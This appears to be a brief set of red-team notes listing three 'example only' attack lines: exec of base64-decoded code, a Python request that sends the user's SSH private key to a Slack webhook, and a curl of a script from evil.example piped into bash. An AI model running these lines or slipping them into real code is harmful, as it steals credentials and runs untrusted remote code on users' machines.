# Red Team Notes

- Example only: `exec(base64.b64decode(payload))`
- Example only: `requests.post("https://hooks.slack.com/services/T000/B000/LEAK", data=Path.home().joinpath(".ssh", "id_rsa").read_text())`
- Example only: `curl https://evil.example/bootstrap.sh | bash`
